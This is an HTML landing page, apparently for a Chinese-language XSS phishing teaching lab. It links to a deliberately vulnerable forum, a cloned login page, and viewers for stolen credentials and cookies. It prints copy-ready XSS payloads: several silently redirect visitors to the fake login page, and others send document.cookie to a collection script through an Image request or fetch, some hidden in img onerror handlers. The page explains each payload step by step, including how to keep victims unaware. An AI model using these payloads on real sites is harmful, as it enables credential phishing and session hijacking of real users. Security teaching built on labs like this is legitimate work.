<!DOCTYPE html>
<!--
  XSS钓鱼攻击演示平台
  
  @author  Guojin0826
  @email   jinrcsy@gmail.com
  @github  https://github.com/Guojin0826
-->
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS钓鱼攻击演示 - 安全教学</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            min-height: 100vh;
            padding: 40px 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { text-align: center; margin-bottom: 10px; font-size: 36px; }
        .subtitle { text-align: center; color: #e94560; margin-bottom: 40px; font-size: 18px; }
        .warning-banner {
            background: linear-gradient(90deg, #e94560, #ff6b6b);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 40px;
            font-size: 16px;
            line-height: 1.6;
        }
        .demo-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .demo-card {
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            padding: 25px;
            transition: transform 0.3s, box-shadow 0.3s;
            border: 2px solid transparent;
        }
        .demo-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(233, 69, 96, 0.3);
            border-color: #e94560;
        }
        .card-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
        .card-icon { font-size: 40px; }
        .card-title { font-size: 20px; font-weight: bold; }
        .card-desc { color: #aaa; margin-bottom: 20px; line-height: 1.6; }
        .card-features { margin-bottom: 20px; }
        .feature-item { color: #4ecdc4; margin-bottom: 8px; font-size: 14px; }
        .feature-item:before { content: '✓ '; }
        .btn-demo {
            display: inline-block;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px 25px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: bold;
            transition: transform 0.2s;
        }
        .btn-demo:hover { transform: scale(1.05); }
        .clean-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 10px;
        }
        .btn-clean {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            border: none;
            cursor: pointer;
            font-size: 15px;
            font-weight: bold;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(233, 69, 96, 0.3);
        }
        .btn-clean:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(233, 69, 96, 0.5);
        }
        .btn-clean:active {
            transform: translateY(-1px);
        }
        .btn-icon {
            font-size: 20px;
        }
        .btn-text {
            font-size: 14px;
        }
        .status-message {
            margin-top: 20px;
            padding: 12px 18px;
            border-radius: 8px;
            font-size: 14px;
            display: none;
            animation: slideIn 0.3s ease;
        }
        .status-success {
            background: rgba(78, 205, 196, 0.2);
            border-left: 4px solid #4ecdc4;
            color: #4ecdc4;
        }
        .status-error {
            background: rgba(233, 69, 96, 0.2);
            border-left: 4px solid #e94560;
            color: #e94560;
        }
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .btn-danger {
            background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
        }
        .flow-section {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 40px;
        }
        .flow-title { font-size: 24px; margin-bottom: 25px; text-align: center; }
        .flow-steps { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
        .flow-step {
            background: rgba(233, 69, 96, 0.2);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            flex: 1;
            min-width: 200px;
            max-width: 250px;
        }
        .step-number {
            background: #e94560;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            font-weight: bold;
            font-size: 20px;
        }
        .step-title { font-weight: bold; margin-bottom: 10px; }
        .step-desc { font-size: 14px; color: #aaa; }
        .arrow { font-size: 30px; color: #e94560; display: flex; align-items: center; }
        .payload-section {
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 40px;
        }
        .payload-title { font-size: 20px; margin-bottom: 20px; color: #4ecdc4; }
        .code-block {
            background: #0d1117;
            padding: 20px;
            border-radius: 8px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 15px;
            border-left: 4px solid #e94560;
        }
        .copy-btn {
            background: #4ecdc4;
            color: #1a1a2e;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        .copy-btn:hover { background: #45b7aa; }
        .explain-section {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 40px;
            border: 2px solid #4ecdc4;
        }
        .explain-title { font-size: 24px; margin-bottom: 25px; text-align: center; color: #4ecdc4; }
        .explain-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .explain-card {
            background: rgba(0,0,0,0.3);
            border-radius: 10px;
            padding: 20px;
            border-left: 4px solid #e94560;
        }
        .explain-card-title { font-size: 18px; color: #ff6b6b; margin-bottom: 15px; font-weight: bold; }
        .explain-item { margin-bottom: 12px; }
        .explain-label { color: #4ecdc4; font-weight: bold; margin-bottom: 5px; }
        .explain-code {
            background: #0d1117;
            padding: 8px 12px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #ff6b6b;
            display: inline-block;
            margin-top: 5px;
        }
        .explain-text { color: #aaa; font-size: 14px; line-height: 1.6; }
        .component-box {
            background: rgba(78, 205, 196, 0.1);
            border: 1px solid #4ecdc4;
            border-radius: 8px;
            padding: 15px;
            margin: 10px 0;
        }
        .component-title { color: #4ecdc4; font-weight: bold; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎣 XSS钓鱼攻击演示平台</h1>
        <p class="subtitle">演示跨站脚本攻击窃取用户凭据的完整流程</p>
        
        <div class="warning-banner">
            ⚠️ <strong>警告</strong>：本平台仅用于安全教学和演示目的！<br>
            请勿将所学技术用于非法用途，否则将承担法律责任。
        </div>

        <div class="demo-grid">
            <!-- 存在漏洞的论坛 -->
            <div class="demo-card">
                <div class="card-header">
                    <span class="card-icon">🛡️</span>
                    <span class="card-title">XSS防御演示</span>
                </div>
                <div class="card-body">
                    <p style="margin-bottom: 20px;">学习如何正确防御XSS攻击，保护Web应用安全</p>
                    <a href="defense_demo.php" class="btn-demo">进入演示</a>
                </div>
            </div>
            
            <!-- 一键清理功能 -->
            <div class="demo-card">
                <div class="card-header">
                    <span class="card-icon">🗑️</span>
                    <span class="card-title">一键清理功能</span>
                </div>
                <div class="card-body">
                    <p style="margin-bottom: 20px;">快速清理演示数据，重置演示环境</p>
                    <div class="clean-buttons">
                        <button onclick="clearComments()" class="btn-clean">
                            <span class="btn-icon">💬</span>
                            <span class="btn-text">清理论坛留言</span>
                        </button>
                        <button onclick="clearCredentials()" class="btn-clean">
                            <span class="btn-icon">🔑</span>
                            <span class="btn-text">清空凭据数据</span>
                        </button>
                        <button onclick="clearCookies()" class="btn-clean">
                            <span class="btn-icon">🍪</span>
                            <span class="btn-text">清空Cookie数据</span>
                        </button>
                    </div>
                    <div id="clearStatus" class="status-message"></div>
                </div>
            </div>
            
            <!-- 钓鱼平台演示 -->

            
            <div class="demo-card">
                <div class="card-header">
                    <span class="card-icon">💬</span>
                    <span class="card-title">存在漏洞的论坛</span>
                </div>
                <p class="card-desc">一个拟真的技术论坛页面，存在存储型XSS漏洞，攻击者可以在评论区注入恶意代码。</p>
                <div class="card-features">
                    <div class="feature-item">存储型XSS漏洞</div>
                    <div class="feature-item">反射型XSS漏洞</div>
                    <div class="feature-item">拟真业务场景</div>
                </div>
                <a href="forum.php" class="btn-demo">访问论坛</a>
            </div>

            <div class="demo-card">
                <div class="card-header">
                    <span class="card-icon">🔐</span>
                    <span class="card-title">伪造登录页面</span>
                </div>
                <p class="card-desc">高度仿真的论坛登录页面，用于诱骗用户输入用户名和密码。</p>
                <div class="card-features">
                    <div class="feature-item">完美复刻真实页面</div>
                    <div class="feature-item">自动跳转回原页面</div>
                    <div class="feature-item">凭据自动保存</div>
                </div>
                <a href="phishing/login.html" class="btn-demo">查看钓鱼页面</a>
            </div>

            <div class="demo-card">
                <div class="card-header">
                    <span class="card-icon">📊</span>
                    <span class="card-title">凭据查看器</span>
                </div>
                <p class="card-desc">查看所有被窃取的用户凭据，包括用户名、密码、IP地址等信息。</p>
                <div class="card-features">
                    <div class="feature-item">实时更新数据</div>
                    <div class="feature-item">显示详细信息</div>
                    <div class="feature-item">支持清空数据</div>
                </div>
                <a href="view_credentials.php" class="btn-demo btn-danger">查看凭据</a>
            </div>

            <div class="demo-card">
                <div class="card-header">
                    <span class="card-icon">🍪</span>
                    <span class="card-title">Cookie查看器</span>
                </div>
                <p class="card-desc">查看所有被窃取的用户Cookie，包括Session ID、用户信息等敏感数据。</p>
                <div class="card-features">
                    <div class="feature-item">实时捕获Cookie</div>
                    <div class="feature-item">显示完整Cookie内容</div>
                    <div class="feature-item">支持清空数据</div>
                </div>
                <a href="view_cookies.php" class="btn-demo btn-danger">查看Cookie</a>
            </div>
        </div>

        <div class="flow-section">
            <h2 class="flow-title">🎯 钓鱼攻击流程演示</h2>
            <div class="flow-steps">
                <div class="flow-step">
                    <div class="step-number">1</div>
                    <div class="step-title">注入恶意代码</div>
                    <div class="step-desc">攻击者在论坛评论区注入XSS Payload</div>
                </div>
                <div class="arrow">→</div>
                <div class="flow-step">
                    <div class="step-number">2</div>
                    <div class="step-title">用户访问页面</div>
                    <div class="step-desc">其他用户浏览帖子，恶意代码自动执行</div>
                </div>
                <div class="arrow">→</div>
                <div class="flow-step">
                    <div class="step-number">3</div>
                    <div class="step-title">跳转钓鱼页面</div>
                    <div class="step-desc">用户被重定向到伪造的登录页面</div>
                </div>
                <div class="arrow">→</div>
                <div class="flow-step">
                    <div class="step-number">4</div>
                    <div class="step-title">窃取凭据</div>
                    <div class="step-desc">用户输入账号密码，凭据被保存</div>
                </div>
                <div class="arrow">→</div>
                <div class="flow-step">
                    <div class="step-number">5</div>
                    <div class="step-title">无感跳回</div>
                    <div class="step-desc">自动跳转回原页面，用户毫无察觉</div>
                </div>
            </div>
        </div>

        <div class="flow-section" style="background: rgba(255, 107, 107, 0.1);">
            <h2 class="flow-title">🍪 Cookie窃取攻击流程</h2>
            <div class="flow-steps">
                <div class="flow-step">
                    <div class="step-number">1</div>
                    <div class="step-title">注入Cookie窃取代码</div>
                    <div class="step-desc">攻击者在评论区注入窃取Cookie的脚本</div>
                </div>
                <div class="arrow">→</div>
                <div class="flow-step">
                    <div class="step-number">2</div>
                    <div class="step-title">用户访问页面</div>
                    <div class="step-desc">其他用户浏览帖子，Cookie自动发送</div>
                </div>
                <div class="arrow">→</div>
                <div class="flow-step">
                    <div class="step-number">3</div>
                    <div class="step-title">Cookie被窃取</div>
                    <div class="step-desc">Cookie通过隐蔽请求发送到攻击者服务器</div>
                </div>
                <div class="arrow">→</div>
                <div class="flow-step">
                    <div class="step-number">4</div>
                    <div class="step-title">攻击者获取Cookie</div>
                    <div class="step-desc">攻击者查看窃取的Cookie数据</div>
                </div>
                <div class="arrow">→</div>
                <div class="flow-step">
                    <div class="step-number">5</div>
                    <div class="step-title">身份冒充</div>
                    <div class="step-desc">使用Cookie冒充用户身份登录</div>
                </div>
            </div>
        </div>

        <div class="explain-section">
            <h2 class="explain-title">📚 XSS Payload 构成详解</h2>
            <p style="text-align: center; color: #aaa; margin-bottom: 30px;">了解XSS Payload的各个组成部分，帮助你更好地理解和防御XSS攻击</p>
            
            <div class="explain-grid">
                <!-- 钓鱼攻击Payload解析 -->
                <div class="explain-card">
                    <div class="explain-card-title">🎣 钓鱼攻击 Payload 解析</div>
                    
                    <div class="component-box">
                        <div class="component-title">1️⃣ 触发载体</div>
                        <div class="explain-code">&lt;script&gt;...&lt;/script&gt;</div>
                        <p class="explain-text">HTML script标签，用于包裹JavaScript代码。浏览器解析到此标签时会自动执行其中的脚本。</p>
                    </div>
                    
                    <div class="component-box">
                        <div class="component-title">2️⃣ 防重复机制</div>
                        <div class="explain-code">if (!sessionStorage.getItem('phished'))</div>
                        <p class="explain-text">检查sessionStorage中是否已存在标记，避免用户反复跳转造成死循环。</p>
                    </div>
                    
                    <div class="component-box">
                        <div class="component-title">3️⃣ 标记设置</div>
                        <div class="explain-code">sessionStorage.setItem('phished', 'true')</div>
                        <p class="explain-text">设置标记，表示该用户已被攻击过。sessionStorage在浏览器关闭后自动清除。</p>
                    </div>
                    
                    <div class="component-box">
                        <div class="component-title">4️⃣ 获取当前URL</div>
                        <div class="explain-code">var currentUrl = window.location.href</div>
                        <p class="explain-text">获取当前页面URL，用于构造返回地址，让用户在钓鱼后能跳回原页面。</p>
                    </div>
                    
                    <div class="component-box">
                        <div class="component-title">5️⃣ 构造钓鱼URL</div>
                        <div class="explain-code">var phishingUrl = 'phishing/login.html?redirect=' + encodeURIComponent(currentUrl)</div>
                        <p class="explain-text">构造钓鱼页面URL，使用encodeURIComponent对当前URL进行编码，避免特殊字符破坏URL结构。</p>
                    </div>
                    
                    <div class="component-box">
                        <div class="component-title">6️⃣ 执行跳转</div>
                        <div class="explain-code">window.location.href = phishingUrl</div>
                        <p class="explain-text">修改浏览器地址，实现页面跳转。用户会被重定向到伪造的登录页面。</p>
                    </div>
                </div>

                <!-- Cookie窃取Payload解析 -->
                <div class="explain-card">
                    <div class="explain-card-title">🍪 Cookie窃取 Payload 解析</div>
                    
                    <div class="component-box">
                        <div class="component-title">1️⃣ 触发载体</div>
                        <div class="explain-code">&lt;script&gt;...&lt;/script&gt;</div>
                        <p class="explain-text">使用script标签执行JavaScript代码，也可以使用img标签的onerror事件。</p>
                    </div>
                    
                    <div class="component-box">
                        <div class="component-title">2️⃣ 创建图片对象</div>
                        <div class="explain-code">var img = new Image()</div>
                        <p class="explain-text">创建一个Image对象。浏览器会尝试加载这个图片，从而触发HTTP请求。</p>
                    </div>
                    
                    <div class="component-box">
                        <div class="component-title">3️⃣ 获取Cookie</div>
                        <div class="explain-code">document.cookie</div>
                        <p class="explain-text">读取当前页面的所有Cookie，包括Session ID、用户令牌等敏感信息。</p>
                    </div>
                    
                    <div class="component-box">
                        <div class="component-title">4️⃣ URL编码</div>
                        <div class="explain-code">encodeURIComponent(document.cookie)</div>
                        <p class="explain-text">对Cookie进行URL编码，确保特殊字符（如分号、等号）不会破坏URL结构。</p>
                    </div>
                    
                    <div class="component-box">
                        <div class="component-title">5️⃣ 构造请求URL</div>
                        <div class="explain-code">'steal_cookie.php?cookie=' + encodedCookie</div>
                        <p class="explain-text">构造攻击者服务器的URL，将Cookie作为参数传递。这是一个隐蔽的GET请求。</p>
                    </div>
                    
                    <div class="component-box">
                        <div class="component-title">6️⃣ 发送请求</div>
                        <div class="explain-code">img.src = '...'</div>
                        <p class="explain-text">设置图片的src属性，浏览器会立即发起HTTP请求，Cookie被悄悄发送到攻击者服务器。</p>
                    </div>
                </div>
            </div>

            <!-- 关键技术点 -->
            <div style="margin-top: 30px;">
                <h3 style="color: #ff6b6b; margin-bottom: 20px;">⚡ 关键技术点</h3>
                
                <div class="explain-grid">
                    <div class="explain-card">
                        <div class="explain-card-title">🔑 为什么使用 sessionStorage？</div>
                        <p class="explain-text">• 防止死循环：避免用户反复跳转</p>
                        <p class="explain-text">• 自动清除：关闭浏览器后标记消失</p>
                        <p class="explain-text">• 隐蔽性强：不会留下持久痕迹</p>
                        <p class="explain-text">• 替代方案：也可以使用URL参数判断</p>
                    </div>
                    
                    <div class="explain-card">
                        <div class="explain-card-title">🖼️ 为什么使用 Image 对象？</div>
                        <p class="explain-text">• 跨域友好：不受同源策略限制</p>
                        <p class="explain-text">• 无感发送：不会阻塞页面加载</p>
                        <p class="explain-text">• 隐蔽性强：不会在页面显示任何内容</p>
                        <p class="explain-text">• 兼容性好：所有浏览器都支持</p>
                    </div>
                    
                    <div class="explain-card">
                        <div class="explain-card-title">🔐 encodeURIComponent 作用</div>
                        <p class="explain-text">• 编码特殊字符：如 & ? = # 等</p>
                        <p class="explain-text">• 保证URL完整性：避免参数解析错误</p>
                        <p class="explain-text">• 支持中文：正确处理非ASCII字符</p>
                        <p class="explain-text">• 安全传输：确保数据完整到达</p>
                    </div>
                    
                    <div class="explain-card">
                        <div class="explain-card-title">⚠️ 攻击成功的关键</div>
                        <p class="explain-text">• 存在XSS漏洞：页面未过滤用户输入</p>
                        <p class="explain-text">• 用户信任：页面看起来正常</p>
                        <p class="explain-text">• 无感操作：用户毫无察觉</p>
                        <p class="explain-text">• 自动执行：浏览器自动运行脚本</p>
                    </div>
                </div>
            </div>

            <!-- 完整Payload示例 -->
            <div style="margin-top: 30px;">
                <h3 style="color: #4ecdc4; margin-bottom: 20px;">📝 完整Payload示例（带注释）</h3>
                <div class="code-block" style="background: #0d1117; padding: 25px; border-radius: 10px;">
                    <pre style="color: #e6edf3; margin: 0; white-space: pre-wrap;">
<span style="color: #8b949e;">// 钓鱼攻击完整Payload</span>
<span style="color: #ff7b72;">&lt;script&gt;</span>
<span style="color: #8b949e;">// 1. 检查是否已经攻击过</span>
<span style="color: #ff7b72;">if</span> (<span style="color: #79c0ff;">!</span><span style="color: #d2a8ff;">sessionStorage.getItem</span>(<span style="color: #a5d6ff;">'phished'</span>)) {
    
    <span style="color: #8b949e;">// 2. 设置已攻击标记</span>
    <span style="color: #d2a8ff;">sessionStorage.setItem</span>(<span style="color: #a5d6ff;">'phished'</span>, <span style="color: #a5d6ff;">'true'</span>);
    
    <span style="color: #8b949e;">// 3. 获取当前页面URL</span>
    <span style="color: #ff7b72;">var</span> currentUrl = <span style="color: #79c0ff;">window</span>.<span style="color: #79c0ff;">location</span>.<span style="color: #79c0ff;">href</span>;
    
    <span style="color: #8b949e;">// 4. 构造钓鱼页面URL（带返回地址）</span>
    <span style="color: #ff7b72;">var</span> phishingUrl = <span style="color: #a5d6ff;">'phishing/login.html?redirect='</span> 
                    + <span style="color: #d2a8ff;">encodeURIComponent</span>(currentUrl);
    
    <span style="color: #8b949e;">// 5. 跳转到钓鱼页面</span>
    <span style="color: #79c0ff;">window</span>.<span style="color: #79c0ff;">location</span>.<span style="color: #79c0ff;">href</span> = phishingUrl;
}
<span style="color: #ff7b72;">&lt;/script&gt;</span>

<span style="color: #8b949e;">// Cookie窃取完整Payload</span>
<span style="color: #ff7b72;">&lt;script&gt;</span>
<span style="color: #8b949e;">// 1. 创建Image对象（用于发送请求）</span>
<span style="color: #ff7b72;">var</span> img = <span style="color: #ff7b72;">new</span> <span style="color: #d2a8ff;">Image</span>();

<span style="color: #8b949e;">// 2. 构造请求URL（包含Cookie）</span>
<span style="color: #ff7b72;">var</span> url = <span style="color: #a5d6ff;">'steal_cookie.php?cookie='</span> 
         + <span style="color: #d2a8ff;">encodeURIComponent</span>(<span style="color: #79c0ff;">document</span>.<span style="color: #79c0ff;">cookie</span>);

<span style="color: #8b949e;">// 3. 发送请求（浏览器会尝试加载这个图片）</span>
img.<span style="color: #79c0ff;">src</span> = url;
<span style="color: #ff7b72;">&lt;/script&gt;</span></pre>
                </div>
            </div>
        </div>

        <div class="payload-section">
            <h2 class="payload-title">💉 XSS Payload 示例</h2>
            
            <h3 style="margin: 20px 0 10px; color: #fff;">方式1：直接跳转（带确认提示）</h3>
            <div class="code-block" id="payload1">&lt;script&gt;
if (!sessionStorage.getItem('phished')) {
    sessionStorage.setItem('phished', 'true');
    var currentUrl = window.location.href;
    var phishingUrl = 'phishing/login.html?redirect=' + encodeURIComponent(currentUrl);
    if (confirm('您的会话已过期，请重新登录')) {
        window.location.href = phishingUrl;
    }
}
&lt;/script&gt;</div>
            <button class="copy-btn" onclick="copyPayload('payload1')">复制代码</button>

            <h3 style="margin: 20px 0 10px; color: #fff;">方式2：自动跳转（无提示，更隐蔽）</h3>
            <div class="code-block" id="payload2">&lt;script&gt;
if (!sessionStorage.getItem('phished')) {
    sessionStorage.setItem('phished', 'true');
    var currentUrl = window.location.href;
    var phishingUrl = 'phishing/login.html?redirect=' + encodeURIComponent(currentUrl);
    window.location.href = phishingUrl;
}
&lt;/script&gt;</div>
            <button class="copy-btn" onclick="copyPayload('payload2')">复制代码</button>

            <h3 style="margin: 20px 0 10px; color: #fff;">方式3：隐藏在图片错误事件中</h3>
            <div class="code-block" id="payload3">&lt;img src="x" onerror="
if (!sessionStorage.getItem('phished')) {
    sessionStorage.setItem('phished', 'true');
    var currentUrl = window.location.href;
    var phishingUrl = 'phishing/login.html?redirect=' + encodeURIComponent(currentUrl);
    window.location.href = phishingUrl;
}
"&gt;</div>
            <button class="copy-btn" onclick="copyPayload('payload3')">复制代码</button>

            <h3 style="margin: 40px 0 10px; color: #ff6b6b;">🍪 Cookie窃取 Payload</h3>
            <p style="color: #aaa; margin-bottom: 15px;">以下Payload可以窃取用户的Cookie并发送到攻击者服务器：</p>
            
            <h4 style="margin: 20px 0 10px; color: #fff;">方式1：使用img标签（推荐）</h4>
            <div class="code-block" id="payload4">&lt;script&gt;
var img = new Image();
img.src = 'steal_cookie.php?cookie=' + encodeURIComponent(document.cookie);
&lt;/script&gt;</div>
            <button class="copy-btn" onclick="copyPayload('payload4')">复制代码</button>

            <h4 style="margin: 20px 0 10px; color: #fff;">方式2：使用fetch API</h4>
            <div class="code-block" id="payload5">&lt;script&gt;
fetch('steal_cookie.php?cookie=' + encodeURIComponent(document.cookie));
&lt;/script&gt;</div>
            <button class="copy-btn" onclick="copyPayload('payload5')">复制代码</button>

            <h4 style="margin: 20px 0 10px; color: #fff;">方式3：隐藏在图片错误事件中</h4>
            <div class="code-block" id="payload6">&lt;img src="x" onerror="
var img = new Image();
img.src = 'steal_cookie.php?cookie=' + encodeURIComponent(document.cookie);
"&gt;</div>
            <button class="copy-btn" onclick="copyPayload('payload6')">复制代码</button>
        </div>

        <div style="text-align: center; color: #aaa; padding: 20px;">
            <p>📚 详细说明请查看 <a href="README.md" style="color: #4ecdc4;">README.md</a></p>
            <p style="margin-top: 10px;">💡 提示：使用 sessionStorage 避免循环跳转，用户关闭浏览器后会重置</p>
        </div>
    </div>

    <script>
        function copyPayload(id) {
            var text = document.getElementById(id).textContent;
            navigator.clipboard.writeText(text).then(function() {
                alert('Payload已复制到剪贴板！\n\n请粘贴到论坛评论区进行测试。');
            });
        }
        
        // 清理论坛留言
        function clearComments() {
            if(confirm('确定要清空所有论坛留言吗？')) {
                fetch('clear_forum_comments.php')
                    .then(response => response.json())
                    .then(data => {
                        const statusDiv = document.getElementById('clearStatus');
                        statusDiv.style.display = 'block';
                        if(data.success) {
                            statusDiv.innerHTML = '✅ ' + data.message;
                            statusDiv.style.background = 'rgba(78, 205, 196, 0.2)';
                        } else {
                            statusDiv.innerHTML = '❌ ' + data.message;
                            statusDiv.style.background = 'rgba(255, 107, 107, 0.2)';
                        }
                        setTimeout(() => statusDiv.style.display = 'none', 3000);
                    })
                    .catch(error => {
                        const statusDiv = document.getElementById('clearStatus');
                        statusDiv.style.display = 'block';
                        statusDiv.innerHTML = '❌ 清理失败：' + error;
                        statusDiv.style.background = 'rgba(255, 107, 107, 0.2)';
                    });
            }
        }
        
        // 清空凭据数据
        function clearCredentials() {
            if(confirm('确定要清空所有窃取的凭据吗？')) {
                fetch('clear_credentials.php')
                    .then(response => response.json())
                    .then(data => {
                        showStatus(data.success ? 'success' : 'error', data.message);
                    })
                    .catch(error => {
                        showStatus('error', '清理失败：' + error);
                    });
            }
        }
        
        // 清空Cookie数据
        function clearCookies() {
            if(confirm('确定要清空所有窃取的Cookie吗？')) {
                fetch('clear_cookies.php')
                    .then(response => response.json())
                    .then(data => {
                        showStatus(data.success ? 'success' : 'error', data.message);
                    })
                    .catch(error => {
                        showStatus('error', '清理失败：' + error);
                    });
            }
        }
        
        // 显示状态消息
        function showStatus(type, message) {
            const statusDiv = document.getElementById('clearStatus');
            statusDiv.style.display = 'block';
            statusDiv.className = 'status-message status-' + type;
            statusDiv.innerHTML = (type === 'success' ? '✅ ' : '❌ ') + message;
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>